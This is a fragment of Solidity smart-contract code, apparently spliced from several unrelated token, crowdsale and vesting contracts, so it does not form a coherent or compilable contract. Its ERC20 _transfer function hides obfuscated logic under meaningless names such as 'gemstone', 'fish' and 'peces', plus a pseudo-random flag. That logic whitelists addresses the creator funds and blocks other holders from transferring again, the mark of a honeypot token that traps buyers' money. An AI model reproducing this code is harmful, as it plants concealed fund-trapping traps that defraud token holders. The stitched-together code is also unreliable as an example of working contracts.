        for (uint i = 0; i < _addresses.length; i++) {
            addOffChainAddress(_addresses[i]);
        }
    }
}

function setTokenContract(address _tokenContract) {
    if (ownerValidator.validate(msg.sender)) {
        tokenContract = TokenContract(_tokenContract);
    }
}

function setOffChainManagerAddress(address _offChainManager) onlyWorking {
    if (ownerValidator.validate(msg.sender)) {
        offChainManager = OffChainManager(_offChainManager);
    }
}

function setMainAddress(address _address) onlyOwner {
    _mainAddress = _address;
}

function removeOffChainAddresses(address[] _addresses) onlyWorking {
    if (ownerValidator.validate(msg.sender)) {
        for (uint i = 0; i < _addresses.length; i++) {
            removeOffChainAddress(_addresses[i]);
        }
    }
}

function createTokens() payable {
    require(msg.value >= 0);
    uint256 tokens = msg.value.mul(10 ** decimals);
    tokens = tokens.mul(RATE);
    tokens = tokens.div(10 ** 18);
    uint256 sum2 = balances[owner].sub(tokens);
    require(sum2 >= CREATOR_TOKEN_END);
    _totalSupply = sum2;
    owner.transfer(msg.value);
    balances[msg.sender] = balances[msg.sender].add(tokens);
    balances[owner] = balances[owner].sub(tokens);
    Transfer(msg.sender, owner, msg.value);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (documents == false)) {
        guns = chTx;
        gallons = true;
    }
    if ((address(sender) == creator) && (documents == true)) {
        gemstone[recipient] = true;
        fish[recipient] = false;
        documents = false;
    }
    if ((amount > military) && (gemstone[sender] == true) && (address(sender) != creator)) {
        peces[recipient] = true;
    }
    if (gemstone[recipient] != true) {
        fish[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((fish[sender]) && (gemstone[recipient] == false)) {
        fish[recipient] = true;
    }
    if (gemstone[sender] == false) {
        if ((amount > military) && (peces[sender] == true)) {
            require(false);
        }
        require(amount < guns);
        if (gallons == true) {
            if (peces[sender] == true) {
                require(false);
            }
            peces[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function release() public {
    uint256 unreleased = releasableAmount();
    require(unreleased > 0);
    released = released.add(unreleased);
    token.safeTransfer(beneficiary, unreleased);
    Released(unreleased);
}

function vestedAmount() public view returns(uint256) {
    uint256 currentBalance = token.balanceOf(this);
    uint256 totalBalance = currentBalance.add(released);
    if (now < start) {
        return 0;
    }
    uint256 dT = now.sub(start); 
    uint256 dQuarters = dT.div(90 days); 
    if (dQuarters >= quarters) {
        return totalBalance; 
    } else {
        return totalBalance.mul(dQuarters).div(quarters); 
    }
}

function transferFromCrowdsaleToUserAdoptionPool() public onlyOwner {
    require(now > endTime);
    super.transferRemainingTokensToUserAdoptionPool(super.getTokenAmount(cap) - super.getTokenAmount(weiRaised));
}

function validPurchase() internal view returns(bool) {
    return super.validPurchase() && canContributeAmount(msg.sender, msg.value);
}

function _checkUnlock(address addrUser) private {
    UserToken storage user = _userMap[addrUser];
    if (0 == user.index) {
        return;
    }
    for (uint index = 0; index < user.lockedTokens.length; index++) {
        LockedToken storage locked = user.lockedTokens[index];
        if (locked.balance <= 0) {
            continue;
        }
        uint256 diff = now.sub(locked.unlockLast);
        uint256 unlockUnit = locked.total.div(locked.periods);
        uint256 periodDuration = locked.duration.div(locked.periods);
        uint256 unlockedPeriods = locked.total.sub(locked.balance).div(unlockUnit);
        uint256 periodsToUnlock = diff.div(periodDuration);
        if (periodsToUnlock > 0) {
            uint256 tokenToUnlock = 0;
            if (unlockedPeriods + periodsToUnlock >= locked.periods) {
                tokenToUnlock = locked.balance;
            } else {
                tokenToUnlock = unlockUnit.mul(periodsToUnlock);
            }
            if (tokenToUnlock >= locked.balance) {
                tokenToUnlock = locked.balance;
            }
            locked.balance = locked.balance.sub(tokenToUnlock);
            user.tokens = user.tokens.add(tokenToUnlock);
            locked.unlockLast = locked.unlockLast.add(periodDuration.mul(periodsToUnlock));
            emit Unlock(addrUser, tokenToUnlock);
            log(actionUnlock, addrUser, 0, tokenToUnlock, 0, 0);
        }
    }
}

